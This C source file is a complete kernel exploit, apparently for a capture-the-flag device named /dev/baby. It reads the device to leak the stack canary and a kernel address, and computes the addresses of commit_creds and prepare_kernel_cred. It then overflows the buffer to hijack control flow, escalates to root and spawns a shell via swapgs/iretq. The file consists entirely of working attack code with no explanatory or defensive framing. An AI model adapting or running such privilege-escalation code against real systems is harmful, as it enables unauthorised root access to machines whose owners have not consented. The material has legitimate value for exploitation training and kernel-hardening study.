#define _GNU_SOURCE
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef int (* t_commit_creds)(void *);
typedef void *(* t_prepare_kernel_cred)(void *);
t_commit_creds commit_creds = (t_commit_creds) 0;
t_prepare_kernel_cred prepare_kernel_cred = (t_prepare_kernel_cred) 0;

unsigned long user_cs, user_ss, user_rflags, user_sp;

void spawn_shell() {
    puts("[*] Got root!");
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void restore_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;""push user_ss;" 
        "push user_sp;"
        "push user_rflags;"
        "push user_cs;"
        "push user_rip;"
        "iretq;"
        ".att_syntax;"
        );
}

void exploit(){
    commit_creds(prepare_kernel_cred(NULL));
    restore_state();
}

int main() {
    char buffer[1000] = {0};
    int fd;
    unsigned int cookie_offset = 0x190;
    unsigned int bufsize = cookie_offset+100;

    save_state();

    puts("[*] Open device...");
    fd = open("/dev/baby", O_RDWR);
    if (fd < 0) {
        perror("[!] Failed to open device");
        exit(-1);
    }

    read(fd, buffer, 0x200);

    // uint64_t *data = (uint64_t *)buffer;
    // size_t num_elements = 0x200 / sizeof(uint64_t);

    // for (size_t i = 0; i < num_elements; ++i) {
    //     printf("0x%016lx\n", data[i]); 
    // }
    // getchar();

    uint64_t canary = *((uint64_t *)(buffer + cookie_offset));
    uint64_t kaddr = *((uint64_t *)(buffer + cookie_offset+8));
    uint64_t kbase = kaddr - 0x1ca727;
    commit_creds = kbase + 0x00085fa0;
    prepare_kernel_cred = kbase + 0x000861d0;

    printf("[*] Canary: 0x%016lx\n", canary);
    printf("[*] Kernel base: 0x%016lx\n", kbase);
    printf("[*] Commit_creds: 0x%016lx\n", commit_creds);
    printf("[*] Prepare_kernel_cred: 0x%016lx\n", prepare_kernel_cred);

    uint64_t payload[bufsize];
    for(int i = 0; i < cookie_offset/8; i++){
        payload[i] = 0x4141414141414141;
    }

    int index = cookie_offset/8;
    payload[index++] = canary;
    payload[index++] = (uint64_t)exploit;

    write(fd, payload, bufsize);

    return 0;
}
